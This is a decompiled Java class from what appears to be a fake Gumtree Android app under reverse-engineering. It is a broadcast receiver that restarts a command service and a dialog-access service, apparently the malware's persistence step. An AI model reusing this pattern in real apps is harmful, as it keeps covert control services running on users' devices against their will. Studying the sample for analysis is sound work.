package com.gumsis.rcs;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.gumsis.checktls.IntTls;

public class RestartService
  extends BroadcastReceiver
{
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    IntTls.startCommandService(paramContext);
    IntTls.startDialogAccessService(paramContext);
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/rcs/RestartService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */